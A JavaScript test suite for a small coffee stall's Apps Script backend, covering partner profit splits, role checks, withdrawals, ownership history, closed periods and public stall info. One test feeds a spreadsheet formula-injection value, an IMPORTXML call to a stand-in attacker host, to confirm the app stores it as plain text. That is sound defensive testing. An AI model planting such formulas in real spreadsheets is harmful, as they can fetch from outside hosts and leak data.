const test = require('node:test');
const assert = require('node:assert/strict');
const { createRuntime } = require('./gasMock.js');

const VIVEK = 'vivek@gmail.com', AKASH = 'akash@gmail.com', ISHAN = 'ishan@gmail.com'; // Vivek is ADMIN; Akash & Ishan are PARTNERs

function freshApp() {
  const app = createRuntime();
  app.setToday('2026-10-05');
  app.setupForTests();
  const ok = (action, payload, email) => {
    const r = app.call(action, payload, email);
    if (!r.ok) throw new Error(action + ': ' + r.error);
    return r.data;
  };
  return { app, ok };
}

test('§81: public menu exposes no financial or partner data', () => {
  const { app } = freshApp();
  const r = app.call('getMenu', {});
  assert.equal(r.ok, true);
  assert.deepEqual(Object.keys(r.data[0]).sort(), ['category', 'description', 'name', 'price']);
  assert.deepEqual(r.data.map((i) => i.name).slice(0, 3), ['Clear Solution', 'Cryo Pour', 'Cold Fusion']);
  const text = JSON.stringify(r);
  for (const word of ['cogs', 'cost', 'Vivek', 'Ishan', 'ownership', 'profit']) assert.ok(!text.includes(word), word);
});

test('§81: finance actions reject anonymous, unknown and staff users server-side', () => {
  const { app, ok } = freshApp();
  assert.equal(app.call('getPartnerEarnings', {}).code, 'AUTH');
  assert.equal(app.call('getPartnerEarnings', {}, 'stranger@gmail.com').code, 'AUTH');
  ok('saveUser', { email: 'staff@gmail.com', name: 'Staff', role: 'STAFF' }, VIVEK);
  for (const a of ['getPartnerEarnings', 'getMyShare', 'getProfitReport', 'getPL', 'listWithdrawals', 'getOwnership']) {
    assert.equal(app.call(a, {}, 'staff@gmail.com').code, 'FORBIDDEN', a);
  }
  // staff can sell but never sees costs
  const cat = ok('getCatalog', {}, 'staff@gmail.com');
  assert.equal(cat.items[0].unit_cogs, undefined);
  assert.equal(cat.ingredients.length, 0);
  // partners cannot change ownership
  assert.equal(app.call('setOwnership', { effective_from: '2027-01-01', rows: [] }, ISHAN).code, 'FORBIDDEN');
});

test('end-to-end: sale − purchases − expenses → partner earnings 20/20/60 with trace', () => {
  const { app, ok } = freshApp();
  const darkMatter = ok('getCatalog', {}, ISHAN).items.find((i) => i.name === 'Dark Matter');

  ok('openStall', { opening_cash: 500 }, ISHAN);
  const sale = ok('recordSale', { lines: [{ item_id: darkMatter.item_id, qty: 10 }], payment_mode: 'UPI' }, ISHAN);
  assert.equal(sale.total, 800);
  ok('addExpense', { category: 'Electricity', amount: 100, description: 'Generator' }, ISHAN);
  // stock purchase (adds inventory) and a plain item bought from business income
  ok('addPurchase', { ingredient_id: 'ING_beans', qty: 100, total_cost: 200 }, VIVEK);
  const cups = ok('addPurchase', { item: 'Paper cups', qty: 50, unit: 'pc', total_cost: 100 }, AKASH);
  assert.equal(cups.ingredient_id, '');
  assert.equal(cups.ingredient_name, 'Paper cups');
  assert.equal(ok('getInventory', {}, VIVEK).find((i) => i.ingredient_id === 'ING_beans').purchased, 100);

  const e = ok('getPartnerEarnings', { period: 'TODAY' }, VIVEK);
  assert.deepEqual([e.business.revenue, e.business.purchases, e.business.expenses, e.business.profit], [800, 300, 100, 400]);
  assert.equal(e.business.formula, 'Profit = Sales − Purchases − Expenses');
  const share = Object.fromEntries(e.distribution.map((d) => [d.partner_id, d.share]));
  assert.deepEqual(share, { vivek: 80, akash: 80, ishan: 240 });
  assert.equal(e.total_distributed, 400);
  assert.match(e.distribution[0].trace[0], /₹400\.00 × 20% = ₹80\.00/);
  assert.match(e.disclaimer, /Estimated \/ internal/);
  assert.match(app.call('addPurchase', { total_cost: 50 }, VIVEK).error, /Item is required/);
});

test('investment is recorded per item and partner, tracked only (not subtracted from profit)', () => {
  const { app, ok } = freshApp();
  ok('addInvestment', { item: 'Moka pot (6 cup)', qty: 1, amount: 2400, paid_by: 'vivek', date: '2026-09-28' }, VIVEK);
  ok('addInvestment', { item: 'V60 + server', amount: 1800, paid_by: 'akash' }, AKASH);
  const wrong = ok('addInvestment', { item: 'Typo', amount: 99999, paid_by: 'akash' }, AKASH);
  assert.match(app.call('addInvestment', { item: 'Kettle', amount: 900, paid_by: 'nobody' }, VIVEK).error, /who paid/);
  assert.equal(app.call('voidInvestment', { investment_id: wrong.investment_id, reason: 'x' }, AKASH).code, 'FORBIDDEN');
  ok('voidInvestment', { investment_id: wrong.investment_id, reason: 'Typo' }, VIVEK);

  const inv = ok('listInvestments', {}, ISHAN);
  assert.equal(inv.total, 4200);
  assert.deepEqual(inv.by_partner.map((x) => [x.partner_id, x.amount]), [['vivek', 2400], ['akash', 1800], ['ishan', 0]]);
  assert.equal(inv.rows.length, 3);

  const darkMatter = ok('getCatalog', {}, ISHAN).items.find((i) => i.name === 'Dark Matter');
  ok('recordSale', { lines: [{ item_id: darkMatter.item_id, qty: 10 }] }, ISHAN);
  const e = ok('getPartnerEarnings', { period: 'ALL' }, AKASH);
  assert.equal(e.business.profit, 800);
  assert.equal(e.total_invested, 4200);
  assert.equal(e.cumulative.find((c) => c.partner_id === 'vivek').invested, 2400);
  assert.equal(ok('getMyShare', {}, AKASH).invested, 1800);
  assert.ok(ok('listAudit', { entity: 'INVESTMENTS' }, VIVEK).some((a) => a.action === 'VOID_INVESTMENT'));
});

test('INVESTMENTS tab is created on first use in an existing live sheet, other tabs untouched', () => {
  const { app, ok } = freshApp();
  app.ss.sheets = app.ss.sheets.filter((sh) => sh.name !== 'INVESTMENTS'); // a sheet set up before this version
  const before = app.ss.getSheetByName('PARTNERS').rows.length;
  assert.deepEqual(ok('listInvestments', {}, VIVEK).rows, []);
  ok('addInvestment', { item: 'Table', amount: 1500, paid_by: 'vivek' }, VIVEK);
  assert.deepEqual(app.ss.getSheetByName('INVESTMENTS').rows[0].slice(0, 3), ['investment_id', 'date', 'item']);
  assert.equal(app.ss.getSheetByName('PARTNERS').rows.length, before);
});

test('§77–78: withdrawals — partner can only withdraw own share, cannot exceed remaining; audited', () => {
  const { app, ok } = freshApp();
  const capp = ok('getCatalog', {}, ISHAN).items.find((i) => i.name === 'Dark Matter');
  ok('recordSale', { lines: [{ item_id: capp.item_id, qty: 100 }] }, ISHAN); // sales 8,000 → profit 8,000

  let my = ok('getMyShare', {}, AKASH);
  assert.equal(my.total_earned, 1600);
  assert.equal(my.status, 'PENDING');

  assert.match(app.call('recordWithdrawal', { partner_id: 'vivek', amount: 10 }, AKASH).error, /only record your own/);
  assert.match(app.call('recordWithdrawal', { partner_id: 'akash', amount: 5000 }, AKASH).error, /more than the remaining/);

  const w = ok('recordWithdrawal', { partner_id: 'akash', amount: 500, reason: 'Profit withdrawal' }, AKASH);
  assert.deepEqual([w.earned, w.paid, w.remaining, w.status], [1600, 500, 1100, 'PARTIALLY_PAID']);

  my = ok('getMyShare', {}, AKASH);
  assert.deepEqual([my.paid, my.remaining], [500, 1100]);

  // admin may record an advance explicitly
  ok('recordWithdrawal', { partner_id: 'akash', amount: 2000, allow_advance: true }, VIVEK);
  const audit = ok('listAudit', { entity: 'PARTNER_WITHDRAWALS' }, ISHAN);
  assert.equal(audit.length, 2);
  assert.equal(audit[1].user_email, AKASH);
});

test('§79–80: ownership must total 100%, keeps history, applies per period', () => {
  const { app, ok } = freshApp();
  const bad = app.call('setOwnership', { effective_from: '2026-10-10', rows: [
    { partner_id: 'vivek', percentage: 20 }, { partner_id: 'akash', percentage: 20 }, { partner_id: 'ishan', percentage: 50 },
  ] }, VIVEK);
  assert.equal(bad.error, 'Partner ownership must total 100%.');

  const capp = ok('getCatalog', {}, ISHAN).items.find((i) => i.name === 'Dark Matter');
  ok('recordSale', { lines: [{ item_id: capp.item_id, qty: 10 }] }, ISHAN); // 5 Oct
  ok('setOwnership', { effective_from: '2026-10-06', rows: [
    { partner_id: 'vivek', percentage: 25 }, { partner_id: 'akash', percentage: 25 }, { partner_id: 'ishan', percentage: 50 },
  ] }, VIVEK);
  app.setToday('2026-10-06');
  ok('recordSale', { lines: [{ item_id: capp.item_id, qty: 10 }] }, ISHAN); // 6 Oct

  const own = ok('getOwnership', {}, VIVEK);
  assert.equal(own.history.length, 6);
  assert.equal(own.partners.find((p) => p.partner_id === 'vivek').ownership, 25);

  const e = ok('getPartnerEarnings', { period: 'MONTH' }, VIVEK);
  const v = e.distribution.find((d) => d.partner_id === 'vivek');
  // each day: 800 profit → 20% = 160, then 25% = 200
  assert.equal(v.ownership, '20% → 25%');
  assert.equal(v.trace.length, 2);
  assert.equal(e.total_distributed, 1600);
  assert.equal(v.share, 360);

  const audit = ok('listAudit', { entity: 'PARTNER_OWNERSHIP_HISTORY' }, VIVEK);
  assert.ok(audit.some((a) => a.action === 'CHANGE_OWNERSHIP'));
});

test('every recorded expense reduces profit; admin manages the category list', () => {
  const { app, ok } = freshApp();
  ok('addExpense', { category: 'Marketing', amount: 300 }, VIVEK);
  ok('setExpenseRules', { categories: ['Electricity', 'Marketing', 'Ice'] }, VIVEK);
  const pl = ok('getPL', { period: 'TODAY' }, VIVEK);
  assert.deepEqual([pl.expenses, pl.profit], [300, -300]);
  assert.deepEqual(ok('listExpenses', { period: 'TODAY' }, AKASH).categories, ['Electricity', 'Marketing', 'Ice']);
  assert.equal(app.call('setExpenseRules', { categories: ['X'] }, AKASH).code, 'FORBIDDEN');
});

test('§85: profit report rows with FIFO paid/remaining/status and partner/status filters', () => {
  const { app, ok } = freshApp();
  const capp = ok('getCatalog', {}, ISHAN).items.find((i) => i.name === 'Dark Matter');
  ok('recordSale', { lines: [{ item_id: capp.item_id, qty: 100 }] }, ISHAN);
  ok('recordWithdrawal', { partner_id: 'vivek', amount: 1600 }, VIVEK);
  app.setToday('2026-11-03');
  ok('recordSale', { lines: [{ item_id: capp.item_id, qty: 100 }] }, ISHAN);

  const rep = ok('getProfitReport', { period: 'CUSTOM', from: '2026-10-01', to: '2026-11-03', group_by: 'month', partner_id: 'vivek' }, AKASH);
  assert.deepEqual(rep.rows.map((r) => [r.period, r.share, r.paid, r.remaining, r.status]), [
    ['2026-10', 1600, 1600, 0, 'PAID'],
    ['2026-11', 1600, 0, 1600, 'PENDING'],
  ]);
  const pending = ok('getProfitReport', { period: 'ALL', status: 'PENDING' }, AKASH);
  assert.ok(pending.rows.every((r) => r.status === 'PENDING'));
});

test('closing a period snapshots PARTNER_DISTRIBUTIONS and blocks back-dated ownership changes', () => {
  const { app, ok } = freshApp();
  const capp = ok('getCatalog', {}, ISHAN).items.find((i) => i.name === 'Dark Matter');
  ok('recordSale', { lines: [{ item_id: capp.item_id, qty: 10 }] }, ISHAN);
  app.setToday('2026-11-02');
  const snap = ok('closePeriod', { from: '2026-10-01', to: '2026-10-31' }, VIVEK);
  assert.equal(snap.length, 3);
  assert.equal(snap.find((s) => s.partner_id === 'ishan').calculated_share, 480);
  assert.match(app.call('closePeriod', { from: '2026-10-15', to: '2026-10-20' }, VIVEK).error, /overlaps/);
  assert.match(app.call('setOwnership', { effective_from: '2026-10-20', rows: [{ partner_id: 'ishan', percentage: 100 }] }, VIVEK).error, /already closed/);
  const list = ok('listDistributions', {}, VIVEK);
  assert.equal(list.length, 3);
  assert.equal(list[0].live_status, 'PENDING');
});

test('user text that looks like a spreadsheet formula is stored as plain text', () => {
  const { app, ok } = freshApp();
  ok('addExpense', { category: 'Other', amount: 10, description: '=IMPORTXML("http://evil.example","//a")' }, VIVEK);
  const raw = app.ss.getSheetByName('EXPENSES').rows[1];
  assert.ok(raw.some((v) => v === '\'=IMPORTXML("http://evil.example","//a")'));
  const listed = ok('listExpenses', { period: 'TODAY' }, VIVEK).rows[0];
  assert.equal(listed.description, '=IMPORTXML("http://evil.example","//a")');
});

test('input limits: oversized orders, non-numeric amounts and long daily reports are rejected', () => {
  const { app, ok } = freshApp();
  const item = ok('getCatalog', {}, VIVEK).items[0];
  assert.match(app.call('recordSale', { lines: Array(51).fill({ item_id: item.item_id, qty: 1 }) }, VIVEK).error, /Too many lines/);
  assert.match(app.call('recordWithdrawal', { partner_id: 'vivek', amount: '' }, VIVEK).error, /must be a number/);
  assert.match(app.call('addExpense', { category: 'Other', amount: 1e12 }, VIVEK).error, /too large/);
  assert.match(app.call('getProfitReport', { period: 'CUSTOM', from: '2026-01-01', to: '2026-10-05', group_by: 'day' }, VIVEK).error, /about 3 months/);
});

test('production setupSheets refuses placeholder emails', () => {
  const app = createRuntime();
  assert.throws(() => app.setupSheets(), /CHANGE_ME/);
});

test('junk tokens are rejected locally without calling Google, and failures are cached', () => {
  const app = createRuntime();
  app.setupForTests();
  let fetches = 0;
  const orig = app.UrlFetchApp.fetch;
  app.UrlFetchApp.fetch = (u) => { fetches++; return orig(u); };
  const send = (idToken) => JSON.parse(app.doPost({ postData: { contents: JSON.stringify({ action: 'getPL', idToken }) } }).getContent());
  assert.equal(send('garbage').code, 'AUTH');
  assert.equal(send('a.b.c').code, 'AUTH');
  assert.equal(fetches, 0);
});

test('staff only see today and never revenue', () => {
  const { app, ok } = freshApp();
  ok('saveUser', { email: 'staff@gmail.com', name: 'Staff', role: 'STAFF' }, VIVEK);
  const item = ok('getCatalog', {}, 'staff@gmail.com').items[0];
  ok('recordSale', { lines: [{ item_id: item.item_id, qty: 2 }] }, 'staff@gmail.com');
  const s = ok('listSales', { period: 'ALL' }, 'staff@gmail.com');
  assert.equal(s.totals.revenue, undefined);
  assert.equal(s.range.from, '2026-10-05');
});

test('closed periods are locked: no back-dated expenses, voids or ownership changes', () => {
  const { app, ok } = freshApp();
  app.setToday('2026-11-02');
  ok('closePeriod', { from: '2026-10-01', to: '2026-10-31' }, VIVEK);
  assert.match(app.call('addExpense', { category: 'Other', amount: 50, date: '2026-10-15' }, VIVEK).error, /closed/);
  assert.match(app.call('addPurchase', { item: 'Milk', total_cost: 50, date: '2026-10-15' }, VIVEK).error, /closed/);
  assert.match(app.call('setOwnership', { effective_from: '2026-11-01', rows: [
    { partner_id: 'vivek', percentage: 30 }, { partner_id: 'akash', percentage: 10 }, { partner_id: 'ishan', percentage: 60 }] }, VIVEK).error, /in the past/);
});

test('admin can void a wrong withdrawal; it stops counting as paid and is audited', () => {
  const { ok } = freshApp();
  const item = ok('getCatalog', {}, VIVEK).items.find((i) => i.name === 'Dark Matter');
  ok('recordSale', { lines: [{ item_id: item.item_id, qty: 100 }] }, ISHAN);
  const w = ok('recordWithdrawal', { partner_id: 'ishan', amount: 1000 }, ISHAN);
  assert.equal(ok('getMyShare', {}, ISHAN).paid, 1000);
  ok('voidWithdrawal', { withdrawal_id: w.withdrawal.withdrawal_id, reason: 'Entered twice' }, VIVEK);
  assert.equal(ok('getMyShare', {}, ISHAN).paid, 0);
  assert.ok(ok('listAudit', { entity: 'PARTNER_WITHDRAWALS' }, VIVEK).some((a) => a.action === 'VOID_WITHDRAWAL'));
});

test('stall location + contact: partners set them, customers read them publicly (no names/emails/money)', () => {
  const { app, ok } = freshApp();
  // public info starts empty
  assert.deepEqual(app.call('getPublicInfo', {}).data.location, null);
  // Ishan (partner) sets location in one tap and his numbers
  ok('setStallLocation', { lat: 23.0225051, lng: 72.5713621, accuracy: 12, label: 'Near Law Garden' }, ISHAN);
  ok('setContact', { phone: '98250 12345', whatsapp: '+91 98250-12345', delivery_enabled: true, delivery_note: 'Porter across Ahmedabad' }, ISHAN);
  const pub = app.call('getPublicInfo', {});
  assert.equal(pub.ok, true);
  assert.deepEqual(pub.data.location, { lat: 23.022505, lng: 72.571362, label: 'Near Law Garden', updated_at: pub.data.location.updated_at });
  assert.equal(pub.data.phone, '+919825012345');
  assert.equal(pub.data.whatsapp, '+919825012345');
  assert.deepEqual(pub.data.delivery, { enabled: true, note: 'Porter across Ahmedabad' });
  const text = JSON.stringify(pub);
  for (const w of ['ishan', 'Ishan', '@', 'accuracy', 'profit']) assert.ok(!text.includes(w), w);
  // cache is refreshed on change
  ok('setContact', { phone: '9000000001', whatsapp: '', delivery_enabled: false }, VIVEK);
  assert.equal(app.call('getPublicInfo', {}).data.phone, '+919000000001');
  assert.ok(ok('listAudit', { entity: 'SETTINGS' }, VIVEK).some((a) => a.action === 'SET_STALL_LOCATION'));
});

test('stall settings validation and roles', () => {
  const { app, ok } = freshApp();
  ok('saveUser', { email: 'staff@gmail.com', name: 'Staff', role: 'STAFF' }, VIVEK);
  assert.equal(app.call('setStallLocation', { lat: 23, lng: 72 }, 'staff@gmail.com').code, 'FORBIDDEN');
  assert.equal(app.call('setContact', { phone: '9825012345' }).code, 'AUTH');
  assert.match(app.call('setContact', { phone: '12345' }, ISHAN).error, /valid 10-digit/);
  assert.match(app.call('setContact', { phone: '5825012345' }, ISHAN).error, /valid 10-digit/);
  assert.match(app.call('setContact', { phone: '', whatsapp: '', delivery_enabled: true }, ISHAN).error, /before turning on Porter/);
  assert.match(app.call('setStallLocation', { lat: 123, lng: 72 }, ISHAN).error, /too large|Invalid/);
  assert.match(app.call('setStallLocation', { lat: 23, lng: 72, accuracy: 5000 }, ISHAN).error, /accuracy is too low/);
});
